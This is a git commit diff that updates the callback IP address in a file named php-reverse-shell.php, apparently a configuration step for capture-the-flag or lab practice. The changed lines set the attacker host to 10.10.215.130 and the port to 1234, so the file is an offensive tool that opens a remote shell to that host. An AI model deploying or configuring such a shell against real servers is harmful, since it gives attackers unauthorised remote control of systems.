d0fac516fa24a4831cfff88f6d77fdd7a476e291
UP923794 <62351907+UP923794@users.noreply.github.com>
2021-02-11 16:12:33 +0000

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
+$ip = '10.10.215.130';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
